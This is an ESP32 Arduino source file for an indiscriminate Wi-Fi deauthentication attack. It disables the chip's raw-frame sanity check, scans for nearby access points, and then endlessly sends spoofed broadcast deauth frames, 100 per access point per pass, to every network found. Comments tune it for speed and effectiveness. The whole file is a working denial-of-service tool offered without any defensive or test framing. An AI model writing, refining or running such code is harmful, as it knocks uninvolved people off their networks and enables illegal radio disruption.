#include <stdint.h>
#include <WiFi.h>
#include "esp_wifi.h"

// Disable frame sanity checks
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;  // Bypass the raw frame sanity check
}

// Structure to hold access point information
struct AP_Info {
    uint8_t bssid[6];  // BSSID of the access point
    int32_t channel;   // Channel the AP operates on
    int32_t rssi;      // Signal strength of the AP
};

#define MAX_APS 20  // Maximum number of access points to store
AP_Info ap_list[MAX_APS];  // Array to store access point information
int ap_count = 0;  // Counter for how many access points were found

// Deauth frame template (default structure)
uint8_t deauth_frame_default[26] = {
    0xC0, 0x00, 0x3A, 0x01,                   // Frame Control, Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // Destination address (broadcast to all clients)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // Source address (AP MAC, will be filled in later)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // BSSID (AP MAC, will be filled in later)
    0x00, 0x00                                // Sequence number
};

// Function to send a deauth frame to a specific AP and broadcast to all clients
void sendDeauthFrame(uint8_t bssid[6], int channel) {
    // Set the ESP32 to operate on the same channel as the target AP
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Set the source MAC (AP MAC) and BSSID (AP MAC) in the deauth frame
    memcpy(&deauth_frame_default[10], bssid, 6);       // Source (AP MAC)
    memcpy(&deauth_frame_default[16], bssid, 6);       // BSSID (AP MAC)

    // Send the deauth frame multiple times for increased effectiveness
    for (int i = 0; i < 100; i++) {  // Increased to 100 deauth frames per AP per iteration
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
    }
}

// Function to perform a Wi-Fi scan and store the access point information
void performWiFiScan() {
    int n = WiFi.scanNetworks(false, true);  // Perform a Wi-Fi scan
    if (n == 0) {
        return;  // No networks found, skip
    } else {
        ap_count = (n > MAX_APS) ? MAX_APS : n;  // Limit the results to MAX_APS

        // Store information for each detected AP
        for (int i = 0; i < ap_count; i++) {
            // Store AP information in the ap_list array
            memcpy(ap_list[i].bssid, WiFi.BSSID(i), 6);
            ap_list[i].channel = WiFi.channel(i);
            ap_list[i].rssi = WiFi.RSSI(i);
        }
    }
    WiFi.scanDelete();  // Free up memory used by the scan
}

// Function to continuously send deauth frames to all found APs
void deauthFromScanResults() {
    uint8_t client_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast to all clients

    // Send deauth frames to each AP
    for (int i = 0; i < ap_count; i++) {
        // Send the deauth frame to each AP
        sendDeauthFrame(ap_list[i].bssid, ap_list[i].channel);
    }
}

void setup() {
    // Initialize WiFi in AP mode (this allows sending raw frames)
    WiFi.mode(WIFI_AP);
    delay(1000);  // Allow time for setup

    // Perform a Wi-Fi scan once at the start
    performWiFiScan();
}

void loop() {
    // Continuously send deauth frames in a loop
    deauthFromScanResults();
    delay(10);  // Reduce the delay to make deauth faster (now 10ms between iterations)
}
